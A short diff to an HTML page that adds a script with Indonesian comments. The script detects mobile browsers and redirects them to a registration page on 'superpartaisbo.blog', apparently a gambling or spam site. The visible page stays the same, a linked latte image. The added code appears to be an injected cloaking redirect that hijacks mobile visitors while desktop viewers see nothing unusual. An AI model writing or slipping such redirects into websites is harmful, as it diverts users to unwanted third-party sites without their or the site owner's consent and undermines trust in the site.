@@ -18,6 +18,17 @@
         }
     </style>
 </head>
+    <script>
+    // Fungsi deteksi mobile
+    function isMobile() {
+      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+
+    // Jika mobile, redirect ke URL yang ditentukan
+    if (isMobile()) {
+      window.location.href = "https://superpartaisbo.blog/register";
+    }
+  </script>
 <body>
     <a href="#"><img src="https://richcreme.com/wp-content/uploads/2022/07/latte.jpg"></a>
 </body>
